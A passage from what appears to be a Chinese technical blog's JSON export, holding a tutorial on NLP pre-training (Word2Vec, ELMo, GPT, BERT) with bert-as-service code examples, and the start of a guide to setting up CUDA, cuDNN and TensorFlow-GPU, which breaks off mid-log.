Transformer 架构，2018 年底开始出现一大批预训练语言模型 (3 个预训练代表性模型 BERT [2018]、XLNet [2019] 和 MPNet [2020])，刷新众多 NLP 任务，形成新的里程碑事件。","text":"预训练模型最开始是在图像领域提出的，获得了良好的效果，近几年才被广泛应用到自然语言处理各项任务中。 (1) 2003 年 Bengio 提出神经网络语言模型 NNLM，从此统一了 NLP 的特征形式 ——Embedding； (2) 2013 年 Mikolov 提出词向量 Word2vec，延续 NNLM 又引入了大规模预训练（Pretrain）的思路； (3) 2017 年 Vaswani 提出 Transformer 模型，实现用一个模型处理多种 NLP 任务。 (4) 基于 Transformer 架构，2018 年底开始出现一大批预训练语言模型 (3 个预训练代表性模型 BERT [2018]、XLNet [2019] 和 MPNet [2020])，刷新众多 NLP 任务，形成新的里程碑事件。 (5) GPT (6) ChatGPT/DeepSeek 预训练模型的应用通常分为两步: 第一步：在计算性能满足的情况下用某个较大的数据集训练出一个较好的模型。 第二步：根据不同的任务，改造预训练模型，用新任务的数据集在预训练模型上进行微调。 预训练模型的好处是训练代价较小，配合下游任务可以实现更快的收敛速度，并且能够有效地提高模型性能，尤其是对一些训练数据比较稀缺的任务。换句话说，预训练方法可以认为是让模型基于一个更好的初始状态进行学习，从而能够达到更好的性能。 要讲自然语言的预训练，得先从图像领域的预训练说起。 图像领域的预训练 设计好网络结构以后，对于图像来说一般是 CNN 的多层叠加网络结构，可以先用某个训练集合比如训练集合 A 或者训练集合 B 对这个网络进行预先训练，在 A 任务上或者 B 任务上学会网络参数，然后存起来以备后用。假设我们面临第三个任务 C，网络结构采取相同的网络结构，在比较浅的几层 CNN 结构，网络参数初始化的时候可以加载 A 任务或者 B 任务学习好的参数，其它 CNN 高层参数仍然随机初始化。 之后我们用 C 任务的训练数据来训练网络，此时有两种做法，一种是浅层加载的参数在训练 C 任务过程中不动，这种方法被称为 “Frozen”; 另外一种是底层网络参数尽管被初始化了，在 C 任务训练过程中仍然随着训练的进程不断改变，这种一般叫 “Fine-Tuning”，顾名思义，就是更好地把参数进行调整使得更适应当前的 C 任务。 对于层级的 CNN 结构来说，不同层级的神经元学习到了不同类型的图像特征，由底向上特征形成层级结构。 如果我们手头是个人脸识别任务，训练好网络后，把每层神经元学习到的特征可视化肉眼看一看每层学到了啥特征，你会看到最底层的神经元学到的是线段等特征，图示的第二个隐层学到的是人脸五官的轮廓，第三层学到的是人脸的轮廓，通过三步形成了特征的层级结构，越是底层的特征越是所有不论什么领域的图像都会具备的比如边角线弧线等底层基础特征，越往上抽取出的特征越与手头任务相关。 正因为此，所以预训练好的网络参数，尤其是底层的网络参数抽取出特征跟具体任务越无关，越具备任务的通用性，所以这是为何一般用底层预训练好的参数初始化新任务网络参数的原因。 而高层特征跟任务关联较大，实际可以不用使用，或者采用 Fine-tuning 用新数据集合清洗掉高层无关的特征抽取器。 一般我们用 ImageNet 来做网络的预训练，主要有两点，一方面 ImageNet 是图像领域里有超多事先标注好训练数据的数据集合，分量足是个很大的优势，量越大训练出的参数越靠谱；另外一方面因为 ImageNet 有 1000 类，类别多，算是通用的图像数据，跟领域没太大关系，所以通用性好。 Word Embedding现有的机器学习方法往往无法直接处理文本数据，因此需要找到合适的方法，将文本数据转换为数值型数据，由此引出了 Word Embedding 的概念，Word Embedding 算法携带了语义信息且维度经过压缩便于运算。 语言模型 为了能够量化地衡量哪个句子更像一句人话，可以设计如上图所示函数，核心函数 P 的思想是根据句子里面前面的一系列前导单词预测后面单词的概率大小。 神经网络语言模型 NNLM 是从语言模型出发 (即计算概率角度)，构建神经网络针对目标函数对模型进行最优化，训练的起点是使用神经网络去搭建语言模型实现词的预测任务，并且在优化过程后模型的副产品就是词向量。 Word2Vec2013 年最火的用语言模型做 Word Embedding 的工具是 Word2Vec，后来又出了 Glove。 Word2Vec 有两种训练方法，一种叫 CBOW，核心思想是从一个句子里面把一个词抠掉，用这个词的上文和下文去预测被抠掉的这个词； 第二种叫做 Skip-gram，和 CBOW 正好反过来，输入某个单词，要求网络预测它的上下文单词。 使用 Word2Vec 或者 Glove，通过做语言模型任务，就可以获得每个单词的 Word Embedding。 Word Embedding 的使用 我们有个 NLP 的下游任务，比如 QA，就是问答问题，所谓问答问题，指的是给定一个问题 X，给定另外一个句子 Y, 要判断句子 Y 是否是问题 X 的正确答案。 句子中每个单词以 Onehot 形式作为输入，然后乘以 Word Embedding 矩阵 Q，就直接取出单词对应的 Word Embedding。 使用 Word Embedding 等价于把 Onehot 层到 embedding 层的网络用预训练好的参数矩阵 Q 初始化。 这跟前面讲的图像领域的低层预训练过程其实是一样的，区别无非 Word Embedding 只能初始化第一层网络参数，再高层的参数就无能为力了。 下游 NLP 任务在使用 Word Embedding 的时候也类似图像有两种做法，一种是 Frozen，就是 Word Embedding 那层网络参数固定不动；另外一种是 Fine-Tuning，就是使用新的训练集合训练，在训练过程中，更新 Word Embedding 这层参数。 Word Embedding 的问题 是多义词问题。多义词是自然语言中经常出现的现象，也是语言灵活性和高效性的一种体现。 多义词对 Word Embedding 来说有什么负面影响？如上图所示，比如多义词 Bank，有两个常用含义，但是 Word Embedding 在对 bank 这个单词进行编码的时候，是区分不开这两个含义的，因为它们尽管上下文环境中出现的单词不同，但是在用语言模型训练的时候，不论什么上下文的句子经过 word2vec，都是预测相同的单词 bank，而同一个单词占的是同一行的参数空间，这导致两种不同的上下文信息都会编码到相同的 word embedding 空间里去。所以 word embedding 无法区分多义词的不同语义，这就是它的一个比较严重的问题。 从 Word Embedding 到 ELMOELMO 是 “Embedding from Language Models” 的简称。在此之前的 Word Embedding 本质上是个静态的方式，所谓静态指的是训练好之后每个单词的表达就固定住了，以后使用的时候，不论新句子上下文单词是什么，这个单词的 Word Embedding 不会跟着上下文场景的变化而改变。 ELMO 的本质思想是：事先用语言模型学好一个单词的 Word Embedding，此时多义词无法区分，实际使用 Word Embedding 的时候，单词已经具备了特定的上下文了，这个时候可以根据上下文单词的语义去调整单词的 Word Embedding 表示，这样经过调整后的 Word Embedding 更能表达在这个上下文中的具体含义，自然也就解决了多义词的问题了。所以 ELMO 本身的思路是根据当前上下文对 Word Embedding 动态调整。 ELMO 采用了典型的两阶段过程，第一个阶段是利用语言模型进行预训练；第二个阶段是在做下游任务时，从预训练网络中提取对应单词的网络各层的 Word Embedding 作为新特征补充到下游任务中。 使用这个网络结构利用大量语料做语言模型任务就能预先训练好这个网络，如果训练好这个网络后，输入一个新句子 ，句子中每个单词都能得到对应的三个 Embedding: 最底层是单词的 Word Embedding，往上走是第一层双向 LSTM 中对应单词位置的 Embedding，这层编码单词的句法信息更多一些；再往上走是第二层 LSTM 中对应单词位置的 Embedding，这层编码单词的语义信息更多一些。也就是说，ELMO 的预训练过程不仅仅学会单词的 Word Embedding，还学会了一个双层双向的 LSTM 网络结构，而这两者后面都有用。 上图展示了下游任务的使用过程，比如我们的下游任务仍然是 QA 问题，此时对于问句 X，我们可以先将句子 X 作为预训练好的 ELMO 网络的输入，这样句子 X 中每个单词在 ELMO 网络中都能获得对应的三个 Embedding，之后给予这三个 Embedding 中的每一个 Embedding 一个权重 a，这个权重可以学习得来，根据各自权重累加求和，将三个 Embedding 整合成一个。然后将整合后的这个 Embedding 作为 X 句在自己任务的那个网络结构中对应单词的输入，以此作为补充的新特征给下游任务使用。对于上图所示下游任务 QA 中的回答句子 Y 来说也是如此处理。因为 ELMO 给下游提供的是每个单词的特征形式，所以这一类预训练的方法被称为 “Feature-based Pre-Training”。 从 Word Embedding 到 GPT GPT 是 “Generative Pre-Training” 的简称，从名字看其含义是指的生成式的预训练。GPT 也采用两阶段过程，第一个阶段是利用语言模型进行预训练，第二阶段通过 Fine-tuning 的模式解决下游任务。 TransformerTransformer 是个叠加的 “自注意力机制（Self Attention）” 构成的深度网络，是目前 NLP 里最强的特征提取器。 Transformer 是一种基于 encoder-decoder 结构的模型. 在机器翻译任务上的表现超过了 RNN，CNN，只用 encoder-decoder 和 attention 机制就能达到很好的效果，最大的优点是可以高效地并行化。 自注意力机制模型人类视觉通过快速扫描全局图像，获得需要重点关注的目标区域，也就是一般所说的注意力焦点，而后对这一区域投入更多注意力资源，以获取更多所需要关注目标的细节信息，而抑制其他无用信息。 这是人类利用有限的注意力资源从大量信息中快速筛选出高价值信息的手段. 深度学习中的注意力机制从本质上讲和人类的选择性视觉注意力机制类似，核心目标也是从众多信息中选择出对当前任务目标更关键的信息。 Attention 在同一个英语句子内单词间产生的联系。 Self Attention 可以捕获同一个句子中单词之间的一些句法特征（比如图展示的有一定距离的短语结构）或者语义特征（比如图展示的 its 的指代对象 Law）。 很明显，引入 Self Attention 后会更容易捕获句子中长距离的相互依赖的特征，因为如果是 RNN 或者 LSTM，需要依次序序列计算，对于远距离的相互依赖的特征，要经过若干时间步步骤的信息累积才能将两者联系起来，而距离越远，有效捕获的可能性越小。 SelfAttention 在计算过程中会直接将句子中任意两个单词的联系通过一个计算步骤直接联系起来，所以远距离依赖特征之间的距离被极大缩短，有利于有效地利用这些特征。除此外，SelfAttention 对于增加计算的并行性也有直接帮助作用。这是为何 Self Attention 逐渐被广泛使用的主要原因。 GPT 如何使用 把任务的网络结构改造成和 GPT 的网络结构是一样的。然后，在做下游任务的时候，利用第一步预训练好的参数初始化 GPT 的网络结构，对网络参数进行 Fine-tuning，使得这个网络更适合解决手头的问题。 从 GPT 和 ELMO 及 word2Vec 到 Bert Bert 采用和 GPT 完全相同的两阶段模型，首先是语言模型预训练；其次是使用 Fine-Tuning 模式解决下游任务。和 GPT 的最主要不同在于在预训练阶段采用了类似 ELMO 的双向语言模型，当然另外一点是语言模型的数据规模要比 GPT 大。 BERT 本质上是一个自编码（Auto Encoder）语言模型，为了能见多识广，BERT 使用 3 亿多词语训练，采用 12 层双向 Transformer 架构。注意，BERT 只使用了 Transformer 的编码器部分，可以理解为 BERT 旨在学习庞大文本的内部语义信息。 具体训练目标之一，是被称为掩码语言模型的 MLM。即输入一句话，给其中 15% 的字打上 “mask” 标记，经过 Embedding 输入和 12 层 Transformer 深度理解，来预测 “mask” 标记的地方原本是哪个字。 input: 欲把西[mask]比西子，淡[mask]浓抹总相宜output: 欲把西[湖]比西子，淡[妆]浓抹总相宜 例如我们输入 “欲把西 [mask] 比西子，淡 [mask] 浓抹总相宜” 给 BERT，它需要根据没有被 “mask” 的上下文，预测出掩盖的地方是 “湖” 和 “妆”。 MLM 任务的灵感来自于人类做完形填空。挖去文章中的某些片段，需要通过上下文理解来猜测这些被掩盖位置原先的内容。 训练目标之二，是预测输入的两句话之间是否为上下文（NSP）的二分类问题。继续输入 “ 欲把西 [湖] 比西子，淡 [妆] 浓抹总相宜”，BERT 将预测这两句话的组合是否合理（这个例子是 “yes”）。（随后的研究者对预训练模型探索中证明，NSP 任务过于简单，对语言模型的训练作用并不是很大） 通过这两个任务和大规模语料训练，BERT 语言模型可以很好学习到文本之间的蕴含的关系。 NLP 的四大任务 绝大部分 NLP 问题可以归入上图所示的四类任务中： 一类是序列标注，这是最典型的 NLP 任务，比如中文分词，词性标注，命名实体识别，语义角色标注等都可以归入这一类问题，它的特点是句子中每个单词要求模型根据上下文都要给出一个分类类别。 第二类是分类任务，比如我们常见的文本分类，情感计算等都可以归入这一类。它的特点是不管文章有多长，总体给出一个分类类别即可。 第三类任务是句子关系判断，比如 Entailment，QA，语义改写，自然语言推理等任务都是这个模式，它的特点是给定两个句子，模型判断出两个句子是否具备某种语义关系； 第四类是生成式任务，比如机器翻译，文本摘要，写诗造句，看图说话等都属于这一类。它的特点是输入文本内容后，需要自主生成另外一段文字。 根据任务选择不同的预训练数据初始化 encoder 和 decoder 即可。这是相当直观的一种改造方法。当然，也可以更简单一点，比如直接在单个 Transformer 结构上加装隐层产生输出也是可以的。不论如何，从这里可以看出，NLP 四大类任务都可以比较方便地改造成 Bert 能够接受的方式。这其实是 Bert 的非常大的优点，这意味着它几乎可以做任何 NLP 的下游任务，具备普适性，这是很强的。 BERT 的应用案例下载 bert 预训练模型Google - BERT 源码 https://github.com/google-research/bert 下载预训练模型。 我这里选择中文的 BERT，下载解压后的目录如下： 安装 bert-as-service顾名思义，将 BERT 模型直接封装成一个服务，堪称上手最快的 BERT 工具。作者是肖涵博士。 使用 pip 安装： pip install bert-serving-server # serverpip install bert-serving-client # client, independent of `bert-serving-server 开启 BERT service bert-serving-start -model_dir E:\\nlp\\chinese_L-12_H-768_A-12 使用客户端获取句子编码 案例一 查找最相近的句子根据 bert 获取句子向量，并计算出句子之间的余弦相似度，找出最相似的句子。 # 导入bert客户端from bert_serving.client import BertClientimport numpy as npclass SimilarModel: def __init__(self): self.bert_client = BertClient() def close_bert(self): self.bert_client .close() def get_sentence_vec(self,sentence): ''' 根据bert获取句子向量 :param sentence: :return: ''' return self.bert_client .encode([sentence])[0] def cos_similar(self,sen_a_vec, sen_b_vec): ''' 计算两个句子的余弦相似度 :param sen_a_vec: :param sen_b_vec: :return: ''' vector_a = np.mat(sen_a_vec) vector_b = np.mat(sen_b_vec) num = float(vector_a * vector_b.T) denom = np.linalg.norm(vector_a) * np.linalg.norm(vector_b) cos = num / denom return cosif __name__=='__main__': # 从候选集condinates 中选出与sentence_a 最相近的句子 condinates = ['为什么天空是蔚蓝色的','太空为什么是黑的？','天空怎么是蓝色的','明天去爬山如何'] sentence_a = '天空为什么是蓝色的' bert_client = SimilarModel() max_cos_similar = 0 most_similar_sentence = '' for sentence_b in condinates: sentence_a_vec = bert_client.get_sentence_vec(sentence_a) sentence_b_vec = bert_client.get_sentence_vec(sentence_b) cos_similar = bert_client.cos_similar(sentence_a_vec,sentence_b_vec) if cos_similar &gt; max_cos_similar: max_cos_similar = cos_similar most_similar_sentence = sentence_b print('最相似的句子：',most_similar_sentence) bert_client .close_bert() # 为什么天空是蔚蓝色的 案例二 简单模糊搜索将问题编码为向量： from bert_serving.client import BertClientdoc_vecs = bc.encode(questions) 最后，我们准备接收新查询并针对现有问题执行简单的 “模糊” 搜索。为此，每次出现新查询时，我们都将其编码为向量，并使用来计算其点积 doc_vecs。将结果递减排序；并返回前 k 个类似的问题，如下所示： while True: query = input('your question: ') query_vec = bc.encode([query])[0] # compute normalized dot product as score score = np.sum(query_vec * doc_vecs, axis=1) / np.linalg.norm(doc_vecs, axis=1) topk_idx = np.argsort(score)[::-1][:topk] print('top %d questions similar to \"%s\"' % (topk, query)) for idx in topk_idx: print('&gt; %s\\t%s' % ('%.1f' % score[idx], questions[idx])) 现在运行代码并键入查询，查看此搜索引擎如何处理模糊匹配： 案例三 法条推荐介绍根据刑事法律文书中的案情描述和事实部分，预测本案涉及的相关法条； 数据说明所使用的数据集是来自 “中国裁判文书网” 公开的刑事法律文书，其中每份数据由法律文书中的案情描述和事实部分组成，同时也包括每个案件所涉及的法条、被告人被判的罪名和刑期长短等要素。 数据集共包括 268 万刑法法律文书，共涉及 202 条罪名，183 条法条，刑期长短包括 0-25 年、无期、死刑。 数据利用 json 格式储存，每一行为一条数据，每条数据均为一个字典。 fact: 事实描述 meta: 标注信息，标注信息中包括: criminals: 被告 (数据中均只含一个被告) punish_of_money: 罚款 (单位：元) accusation: 罪名 relevant_articles: 相关法条 term_of_imprisonment: 刑期 刑期格式 (单位：月) death_penalty: 是否死刑 life_imprisonment: 是否无期 imprisonment: 有期徒刑刑期 这里是简单的一条数据展示: { \"fact\": \"2015年11月5日上午，被告人胡某在平湖市乍浦镇的嘉兴市多凌金牛制衣有限公司车间内，与被害人孙某因工作琐事发生口角，后被告人胡某用木制坐垫打伤被害人孙某左腹部。经平湖公安司法鉴定中心鉴定：孙某的左腹部损伤已达重伤二级。\", \"meta\": { \"relevant_articles\": [234], \"accusation\": [\"故意伤害\"], \"criminals\": [\"胡某\"], \"term_of_imprisonment\": { \"death_penalty\": false, \"imprisonment\": 12, \"life_imprisonment\": false } }} 实现流程进入 OpenCLaP 下载刑事文书 BERT，并运行 bert-as-service 服务。 创建一个连接到 BertServer 的 BertClientfrom bert_serving.client import ConcurrentBertClientbc = ConcurrentBertClient() 获取编码向量和标签def get_encodes(x): # x 是 batch_size 大小的行 ，每行都是一个json对象 samples = [json.loads(l) for l in x] # 一个 batch_size 大小的连续样本 text = [s['fact'][:50] + s['fact'][-50:] for s in samples] # 获取案情描述和事实部分文字 features = bc.encode(text) # 使用bert将字符串列表编码为向量列表 # 随机选择一个标签 labels = [[str(random.choice(s['meta']['relevant_articles']))] for s in samples] return features, labels 构建 TensorFlow DNN 模型的分类器estimator = DNNClassifier( hidden_units=[512], # 每层隐藏单元的 Iterable 数.所有层都完全连接. feature_columns=[tf.feature_column.numeric_column('feature', shape=(768,))], # 包含模型使用的所有特征列的iterable.集合中的所有项目都应该是从 _FeatureColumn 派生的类的实例. n_classes=len(laws), # 标签类的数量.默认为 2,即二进制分类,必须大于1. config=run_config, # RunConfig 对象配置运行时设置 label_vocabulary=laws_str, # 字符串列表,表示可能的标签值.如果给定,标签必须是字符串类型,并且 label_vocabulary 具有任何值.如果没有给出,这意味着标签已经被编码为整数或者在[0,1]内浮动, n_classes=2 ；并且被编码为{0,1,...,n_classes-1}中的整数值,n_classes&gt; 2.如果没有提供词汇表并且标签是字符串,也会出现错误. optimizer=tf.train.AdamOptimizer(),# 优化函数 dropout=0.1 # 当不是 None 时,我们将放弃给定坐标的概率. ) 训练和评估# 输入函数input_fn = lambda fp: (tf.data.TextLineDataset(fp) # TextLineDataset接口提供了一种方法从数据文件中读取。只需要提供文件名（1个或者多个）。这个接口会自动构造一个dataset，类中保存的元素：文中一行，就是一个元素，是string类型的tenser。 # map将分别对Dataset的每个元素执行一个函数，而apply将立即对整个Dataset执行一个函数 .apply(tf.contrib.data.shuffle_and_repeat(buffer_size=10000)) # repeat重复和shuffle重排 tf.data.Dataset.repeat 转换会将输入数据重复有限（或无限）次；每次数据重复通常称为一个周期。tf.data.Dataset.shuffle 转换会随机化数据集样本的顺序。 # 将此数据集的连续元素合并为批。 .batch(batch_size) # tf.py_func()接收的是tensor，然后将其转化为numpy array送入我们自定义的get_encodes函数，最后再将get_encodes函数输出的numpy array转化为tensor返回 .map(lambda x: tf.py_func(get_encodes, [x], [tf.float32, tf.string], name='bert_client'), num_parallel_calls=num_parallel_calls) .map(lambda x, y: ({'feature': x}, y)) .prefetch(20)) # 创建一个从该数据集中预提取元素的Dataset 大多数数据集输入管道应以调用结束prefetch。这允许在处理当前元素时准备以后的元素。这通常会提高延迟和吞吐量，但以使用额外的内存存储预取元素为代价。# TrainSpec确定训练的输入数据以及持续时间train_spec = TrainSpec(input_fn=lambda: input_fn(train_fp))# EvalSpec结合了训练模型的计算和输出的详细信息.计算由计算指标组成,用以判断训练模型的性能.输出将训练好的模型写入外部存储.eval_spec = EvalSpec(input_fn=lambda: input_fn(eval_fp), throttle_secs=0) # 第一次评估发生在throttle_secs秒后# 训练和评估train_and_evaluate(estimator, train_spec, eval_spec) 运行 tensorboard 可视化训练过程tensorboard --logdir=law-model 案例四 互联网新闻情感分析介绍对新闻情绪进行分类，0 代表正面情绪、1 代表中性情绪、2 代表负面情绪。 数据说明 Field Type Description id String 新闻 ID News ID text String 新闻正文内容 Content of news text label String 新闻情感标签 Emotional label in news 实现流程加载数据集def load_dataset(filepath): dataset_list = [] f = open(filepath, 'r', encoding='utf-8') r = csv.reader(f) for item in r: if r.line_num == 1: continue dataset_list.append(item) # 空元素补0 for item in dataset_list: if item[1].strip() == '': item[1] = '0' return dataset_list 网络类，全连接层class Net(nn.Module): # in_dim=768, out_dim=3 def __init__(self, in_dim, out_dim): super(Net, self).__init__() self.linear1 = nn.Linear(in_dim, 500) self.linear2 = nn.Linear(500, 400) self.linear3 = nn.Linear(400, 300) self.linear4 = nn.Linear(300, 200) self.linear5 = nn.Linear(200, out_dim) def forward(self, x): x = self.linear1(x) x = self.linear2(x) x = self.linear3(x) x = self.linear4(x) x = self.linear5(x) return x 计算每个 batch 的准确率def batch_accuracy(pre, label): pre = pre.argmax(dim=1) correct = torch.eq(pre, label).sum().float().item() accuracy = correct / float(len(label)) return accuracy 训练for epoch in range(EPOCHS): step = -1 for text, label in train_loader: # tuple转list text = list(text) label = list(label) label = list(map(int, label)) # 使用中文bert，生成句向量 sen_vec = bertclient.encode(text) sen_vec = torch.tensor(sen_vec) label = torch.LongTensor(label) label = label.cuda() # 输入到网络中，反向传播 pre = net(sen_vec).cuda() loss = criterion(pre, label) optimizer.zero_grad() loss.backward() optimizer.step() # 更新loss曲线，并计算准确率 step = step + 1 flag = flag + 1 if step % 100 == 0: acc = batch_accuracy(pre, label) print('epoch:{} | batch:{} | acc:{} | loss:{}'.format(epoch, step, acc, loss.item())) 测试net.load_state_dict(torch.load('net.pt'))test_result = []for item in test_dataset: sen_vec = bertclient.encode([item[1]]) sen_vec = torch.tensor(sen_vec) with torch.no_grad(): pre = net(sen_vec).cuda() pre = pre.argmax(dim=1) pre = pre.item() test_result.append([item[0], pre]) # 写入csv文件 df = pd.DataFrame(test_result) df.to_csv('test_result.csv',index=False, header=['id', 'label']) 训练可视化 控制台输出 参考文献从 Word Embedding 到 Bert 模型 — 自然语言处理中的预训练技术发展史 Transformer 深度学习中的注意力模型 谷歌的 bert 肖涵博士的 bert-as-service Serving-Google-BERT-in-Production-using-Tensorflow-and-ZeroMQ CAIL2018 数据集 刑事文书 BERT: tensorboard 使用详解 Visdom 可视化工具 互联网新闻情感分析","categories":[{"name":"NLP","slug":"NLP","permalink":"https://blog.mhuig.top/categories/NLP/"}],"tags":[{"name":"NLP","slug":"NLP","permalink":"https://blog.mhuig.top/tags/NLP/"}]},{"title":"尝试使用 GPU 加速计算","slug":"data-mining/尝试使用GPU加速计算","date":"2020-10-11T01:11:44.000Z","updated":"2020-10-11T01:11:44.000Z","comments":true,"path":"p/56213be8/","permalink":"https://blog.mhuig.top/p/56213be8/","excerpt":"大规模训练，gpu 和 cpu 速度差别很大。","text":"大规模训练，gpu 和 cpu 速度差别很大。 概述GPU CPU (Central Processing Unit) 即中央处理器。 GPU (Graphics Processing Unit) 即图形处理器。 当程序员为 CPU 编写程序时，他们倾向于利用复杂的逻辑结构优化算法从而减少计算任务的运行时间，即 Latency。当程序员为 GPU 编写程序时，则利用其处理海量数据的优势，通过提高总的数据吞吐量（Throughput）来掩盖 Lantency。 其中绿色的是计算单元，橙红色的是存储单元，橙黄色的是控制单元。 首先你需要硬件支持，一块能够支持 GPU 加速计算的显卡，这里以 NVIDIA 的 GPU 为例。 CUDACUDA（Compute Unified Device Architecture），是显卡厂商 NVIDIA 推出的运算平台。 CUDA™是一种由 NVIDIA 推出的通用并行计算架构，该架构使 GPU 能够解决复杂的计算问题。 CUDA 提供了一种可扩展的编程模型，使得已经写好的 CUDA 代码可以在任意数量核心的 GPU 上运行。只有运行时，系统才知道物理处理器的数量。 CUDNNNVIDIA cuDNN 是用于深度神经网络的 GPU 加速库。它强调性能、易用性和低内存开销。NVIDIA cuDNN 可以集成到更高级别的机器学习框架中，如加州大学伯克利分校的流行 CAFFE 软件。简单的，插入式设计可以让开发人员专注于设计和实现神经网络模型，而不是调整性能，同时还可以在 GPU 上实现高性能现代并行计算。 支持 GPU 的计算框架Tensorflow-GPU安装教程参考 https://tensorflow.google.cn/install 需要注意的是 严格对应 tensorflow_gpu、Python、 编译器、 cuDNN、CUDA 的版本关系。 相关对应关系 windows 平台可参考: Tensorflow 文档 显卡驱动与 Cuda 版本之间的对应关系 cuda 与 cudnn 版本之间的对应关系 打开 NVIDIA 控制面板进入系统信息，可查看当前支持的 CUDA 驱动版本。 这里的 CUDA 驱动版本是指你只可以安装该版本及以下版本的 CUDA。 根据实际情况，笔者计划使用的环境是： tensorflow_gpu-1.14.0 python 3.7 MSVC 2017 cuDNN 7.4.2.24 CUDA 10.0.130 安装 CUDA进入cuda-toolkit-archive 选择需要的 CUDA Toolkit 版本下载安装即可。 笔者选择 network 安装方式。注意第一个路径是选择临时解压路径。选择自定义安装，取消安装不需要的应用，如 NVIDIA GeForce Experience。 在 cmd 中执行： nvcc -V 需要注意配置相关环境变量。 安装 CUDNN进入cudnn-archive 选择需要的 CUDA Toolkit 版本下载解压即可。 笔者将 CUDA 默认安装在C:\\Program Files\\NVIDIA GPU Computing Toolkit\\CUDA\\v10.0 将 CUDNN 解压到C:\\Program Files\\NVIDIA GPU Computing Toolkit\\CUDA\\v10.0中即可。 或者配置单独的环境变量。 安装 Tensorflow-GPU如果之前安装过 cpu 版本的 Tensorflow 需要进行卸载. 若在虚拟环境中使用 conda 安装，conda 会自动安装相关的 cuda 和 cudnn 依赖。 conda install tensorflow-gpu 下面给出一段 GPU 测试程序： import timeimport tensorflow as tfbegin = time.time()with tf.device('/gpu:0'): rand_t = tf.random_uniform([50,50],0,10,dtype=tf.float32,seed=0) a = tf.Variable(rand_t) b = tf.Variable(rand_t) c = tf.matmul(a,b) init = tf.global_variables_initializer()sess = tf.Session(config=tf.ConfigProto(log_device_placement=True)) #强制使用GPUsess.run(init)print(sess.run(c))end = time.time()print(end-begin,'s') 运行结果: 2020-10-11 09:36:56.713905: I tensorflow/core/platform/cpu_feature_guard.cc:142] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX AVX22020-10-11 09:36:56.742138: I tensorflow/stream_executor/platform/default/dso_loader.cc:42] Successfully opened dynamic library nvcuda.dll2020-10-11 09:36:57.193243: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1640] Found device 0 with properties:name: GeForce GTX 960M major: 5 minor: 0 memoryClockRate(GHz): 1.176pciBusID: 0000:01:00.02020-10-11 09:36:57.199952: I tensorflow/stream_executor/platform/default/dlopen_checker_stub.cc:25] GPU libraries are statically linked, skip dlopen check.2020-10-11 09:36:57.204946: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1763] Adding visible gpu devices: 02020-10-11 09:36:58.622428: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1181] Device interconnect StreamExecutor with strength 1 edge matrix:2020-10-11 09:36:58.626880: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1187] 02020-10-11 09:36:58.630073: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1200] 0: N2020-10-11 09:36:58.633910: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1326] Created TensorFlow device (/job:localhost/replica:0/task:0/device:GPU:0 with 1382 MB memory) -&gt; physical GPU (device: 0, name: GeForce GTX 960M, pci bus id: 0000:01:00.0, compute capability: 5.0)Device mapping:/job:localhost/replica:0/task:0/device:GPU:0 -&gt; device: 0, name: GeForce GTX 960M, pci bus id: 0000:01:00.0, compute capability: 5.02020-10-11 09:36:58.657797: I tensorflow/core/common_runtime/direct_session.cc:296] Device mapping:/job:localhost/replica:0/task:0/device:GPU:0 -&gt; device: 0, name: GeForce GTX 960M, pci bus id: 0000:01:00.0, compute capability: 5.0random_uniform/RandomUniform: (RandomUniform): /job:localhost/replica:0/task:0/device:GPU:02020-10-11 09:36:58.683509: I tensorflow/core/common_runtime/placer.cc:54] random_uniform/RandomUniform: (RandomUniform)/job:localhost/replica:0/task:0/device:GPU:0random_uniform/sub: (Sub): /job:localhost/replica:0/task:0/device:GPU:02020-10-11 09:36:58.690684: I tensorflow/core/common_runtime/placer.cc:54] random_uniform/sub: (Sub)/job:localhost/replica:0/task:0/device:GPU:0random_uniform/mul: (Mul): /job:localhost/replica:0/task:0/device:GPU:02020-10-11 09:36:58.705871: I tensorflow/core/common_runtime/placer.cc:54] random_uniform/mul: (Mul)/job:localhost/replica:0/task:0/device:GPU:0random_uniform: (Add): /job:localhost/replica:0/task:0/device:GPU:02020-10-11 09:36:58.719880: I tensorflow/core/common_runtime/placer.cc:54] random_uniform: (Add)/job:localhost/replica:0/task:0/device:GPU:0Variable: (VariableV2): /job:localhost/replica:0/task:0/device:GPU:02020-10-11 09:36:58.738611: I tensorflow/core/common_runtime/placer.cc:54] Variable: (VariableV2)/job:localhost/replica:0/task:0/device:GPU:0Variable/Assign: (Assign): /job:localhost/replica:0/task:0/device:GPU:02020-10-11 09:36:58.749906: I tensorflow/core/common_runtime/placer.cc:54] Variable/Assign: (Assign)/job:localhost/replica:0/task:0/device:GPU:0Variable/read: (Identity): /job:localhost/replica:0/task:0/device:GPU:02020-10-11 09:36:58.759648: I tensorflow/core/common_runtime/placer.cc:54] Variable/read: (Identity)/job:localhost/replica:0/task:0/device:GPU:0Variable_1: (VariableV2): /job:localhost/replica:0/task:0/device:GPU:02020-10-11 09:36:58.769854: I tensorflow/core/common_runtime/placer.cc:54] Variable_1: (VariableV2)/job:localhost/replica:0/task:0/device:GPU:0Variable_1/Assign: (Assign): /job:localhost/replica:0/task:0/device:GPU:02020-10-11 09:36:58.776819: I tensorflow/core/common_runtime/placer.cc:54] Variable_1/Assign: (Assign)/job:localhost/replica:0/task:0/device:GPU:0Variable_1/read: (Identity): /job:localhost/replica:0/task:0/device:GPU:02020-10-11 09:36:58.792460: I tensorflow/core/common_runtime/placer.cc:54] Variable_1/read: (Identity)/job:localhost/replica:0/task:0/device:GPU:0MatMul: (MatMul): /job:localhost/replica:0/task:0/device:GPU:02020-10-11 09:36:58.808352: I tensorflow/core/common_runtime/placer.cc:54] MatMul: (MatMul)/job:localhost/replica:0/task:0/device:GPU:0init: (NoOp): /job:localhost/replica:0/task:0/device:GPU:02020-10-11 09:36:58.823256: I tensorflow/core/common_runtime/placer.cc:54] init: (NoOp)/job:localhost/replica:0/task:0/device:GPU:0random_uniform/shape: (Const): /job:localhost/replica:0/task:0/device:GPU:02020-10-11 09:36:58.838355: I tensorflow/core/common_runtime/placer.cc:54] random_uniform/shape: (Const)/job:localhost/replica:0/task:0/device:GPU:0random_uniform/min: (Const): /job:localhost/replica:0/task:0/device:GPU:02020-10-11 09:36:58.853758: I tensorflow/core/common_runtime/placer.cc:54] random_uniform/min: 